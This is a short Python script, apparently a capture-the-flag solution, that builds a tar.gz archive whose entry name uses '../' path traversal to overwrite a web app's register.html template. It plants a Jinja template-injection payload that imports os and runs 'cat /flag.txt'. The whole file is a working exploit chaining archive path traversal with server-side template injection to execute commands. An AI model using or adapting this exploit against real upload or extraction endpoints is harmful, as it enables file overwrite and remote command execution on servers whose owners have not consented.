#!/usr/bin/python3


import tarfile
import io
import time


filename = "../../../../../../../../../../app/application/templates/register.html"

data = b"""
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}
"""

source = io.BytesIO(initial_bytes=data)

fh = io.BytesIO()
with tarfile.open(fileobj=fh, mode="w:gz") as tar:
    info = tarfile.TarInfo(filename)
    info.size = len(data)
    info.mtime = time.time()
    tar.addfile(info, source)

with open('test.tar.gz', 'wb') as f:
    f.write(fh.getvalue())
    
f.close()


